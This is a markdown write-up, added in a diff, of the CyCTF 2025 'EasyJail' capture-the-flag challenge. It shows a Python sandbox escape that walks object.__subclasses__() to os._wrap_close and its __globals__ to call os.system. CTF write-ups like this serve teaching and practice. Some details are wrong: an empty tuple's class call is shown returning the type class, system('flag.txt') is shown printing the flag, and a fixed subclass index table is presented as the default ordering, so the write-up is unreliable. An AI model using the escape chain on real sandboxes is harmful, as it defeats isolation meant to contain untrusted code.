@@ -1,0 +1,127 @@
+---
+date: 2026-09-26
+---
+# CyCTF qualification 2025 : Misc 'EasyJail'
+
+<!-- more -->
+
+### Escaped a restricted Python environment?
+
+> *وما توفيقي إلا بالله :)*
+
+![](https://cdn-images-1.medium.com/max/1000/1*JFYYd23LbwJCmrc6L1CcdA.jpeg)
+
+We’re dropped into a Python REPL with severe restrictions. The goal? Break out and read the flag.
+
+### Initial Reconnaissance
+
+### What’s Blocked?
+
+Let’s see what we’re working with:
+
+```
+>>> import os
+Error: invalid syntax
+>>> os.system("id")
+Error: name 'os' is not defined
+>>> dir(__builtins__)
+Error: name 'dir' is not defined
+>>> str(something)
+Error: name 'str' is not defined
+>>> # This is a comment
+Error: invalid syntax
+```
+
+The sandbox blocks:
+
+* All imports (`import os`, `import sys`)
+* Builtin functions (`dir()`, `str()`, `list()`, `enumerate()`)
+* Shell commands (this is Python, not bash)
+* Even comments cause syntax errors!
+
+### What Still Works? ✅
+
+```
+>>> ().__class__()
+<class 'type'>
+```
+
+Object introspection is still available. This is our way out !
+--------------------------------------------------------------
+
+### Understanding Python’s Object Model
+
+Here’s the key insight: **Everything in Python inherits from** `<strong class="markup--strong markup--p-strong">object</strong>`.
+
+```
+# The chain:
+()                          # Empty tuple (any object works)
+  .__class__                # <class 'tuple'>
+    .__base__               # <class 'object'> (parent class)
+      .__subclasses__()     # [ALL classes in memory]
+```
+
+This gives us access to **every class loaded in the Python runtime**. Including classes from restricted modules like `os`!
+
+---
+
+### Step 1: Explore the Class Hierarchy
+
+```
+>>> ().__class__.__base__.__subclasses__()
+[<class 'type'>, ..., <class 'os._wrap_close'>, ...]
+```
+
+I noticed `os._wrap_close` in the output - a class from the `os` module!
+
+### Step 2: Find the Index
+
+Since `str()` and `enumerate()` are blocked, I had to manually search:
+
+If we little search about main python library we know that the default of sorting the objects in it on linux os is
+
+* Index 0–20: Core types (type, int, str, …)
+* Index 21–50: Collections (list, dict, set, …)
+* Index 51–80: Internal stuff (iterators, generators, …)
+* Index 81–110: Import system (\_frozen\_importlib, …)
+* Index 111–130: Codecs & encoding
+* Index 131–140: System modules (os, posix, …) # ⬅️ os.\_wrap\_close هنا!
+* Index 141+: Site modules (\_sitebuiltins, …)
+
+```
+>>> ().__class__.__base__.__subclasses__()[120]
+<class '_frozen_importlib_external.PathFinder'>
+>>> ().__class__.__base__.__subclasses__()[130]
+<class 'collections.abc.Hashable'>
+>>> ().__class__.__base__.__subclasses__()[137]
+<class 'os._wrap_close'>  # Found it!
+```
+
+**Why start at 120?** From the initial output, I saw `os._wrap_close` appeared near the end of the list, after `collections.abc` classes. So I did a binary search in that range instead of starting from 0.
+
+### Step 3: Access the Globals Dictionary
+
+Every Python function has a `__globals__` dict containing references to its module's namespace:
+
+```
+>>> ().__class__.__base__.__subclasses__()[137].__init__.__globals__
+{
+  '__name__': 'os',
+  'system': <built-in function system>,
+  'open': <built-in function open>,
+  ...
+}
+```
+
+Perfect! The `os.system` function is right there.
+
+### Step 4: Execute Commands
+
+```
+>>> ().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('ls')
+flag.txt
+>>> ().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']('flag.txt')
+CyCTF{BA6nkRTbx9b0N_dVpIL243pxPKYXnQeYsrNiOYjEk2i65C_U_WG7yrTWdt_O8IJnUqKwydIfIUAAEHRUSFggCp0fyo7XsfC0zk_D}
+```
+
+> *إن أصبت فهو من عند الله، وإن أخطأت فهو من نفسي والشيطان :)*
